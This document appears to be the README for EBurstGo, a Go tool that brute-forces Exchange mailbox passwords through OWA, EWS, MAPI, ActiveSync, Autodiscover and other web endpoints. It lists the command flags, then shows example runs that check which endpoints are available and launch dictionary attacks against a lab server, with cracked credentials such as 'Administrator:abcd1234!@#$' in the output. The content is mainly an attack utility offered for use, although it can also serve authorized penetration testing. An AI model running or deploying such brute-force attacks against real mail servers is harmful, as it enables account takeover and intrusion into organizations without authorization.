# EBurstGo

利用 Exchange 服务器 Web 接口爆破邮箱账户

参考 [grayddq/EBurst](https://github.com/grayddq/EBurst) 项目使用 Go 语言重构

支持接口

```shell
/autodiscover
/owa/auth.owa # OWA & ECP
/ews
/mapi
/oab
/rpc
/Microsoft-Server-ActiveSync
/powershell
```

## Usage

usage

```shell
Usage of ./EBurstGo:
  -check
    	检测目标 Exchange 可用接口
  -debug
    	显示 Debug 信息
  -delay int
    	请求延时
  -domain string
    	AD 域名
  -mode string
    	指定 Exchange Web 接口
  -nocolor
    	关闭输出颜色
  -pass string
    	指定密码
  -passf string
    	密码字典
  -thread int
    	协程数量 (default 2)
  -url string
    	Exchange 服务器地址
  -user string
    	指定用户名
  -userf string
    	用户名字典
  -verbose
    	显示详细信息
```

check

```shell
$ ./EBurstGo -url https://192.168.30.11 -check
[*] 检测目标 Exchange 可用接口
[+] 存在 owa 接口 (/owa/auth.owa), 可以爆破
[+] 存在 powershell 接口 (/powershell), 可以爆破
[+] 存在 ecp 接口 (/owa/auth.owa), 可以爆破
[+] 存在 autodiscover 接口 (/autodiscover), 可以爆破
[+] 存在 mapi 接口 (/mapi), 可以爆破
[+] 存在 activesync 接口 (/Microsoft-Server-ActiveSync), 可以爆破
[+] 存在 oab 接口 (/oab), 可以爆破
[+] 存在 ews 接口 (/ews), 可以爆破
[+] 存在 rpc 接口 (/rpc), 可以爆破
```

brute

```shell
$ ./EBurstGo -url https://192.168.30.11 -domain hack-my.com -userf user.txt -passf pass.txt -mode ews
[*] 使用 ews 接口爆破: https://192.168.30.11
[*] 用户名:7 密码:9 共计:63
[+] 成功: Administrator:abcd1234!@#$
[+] 成功: Alice:Alice123!
[+] 成功: Bob:Bob123!
[+] 成功: Marry:Marry123!
[*] 耗时: 3.031753209s
```

todo
- `/powershell` 接口 (Kerberos 认证) 待支持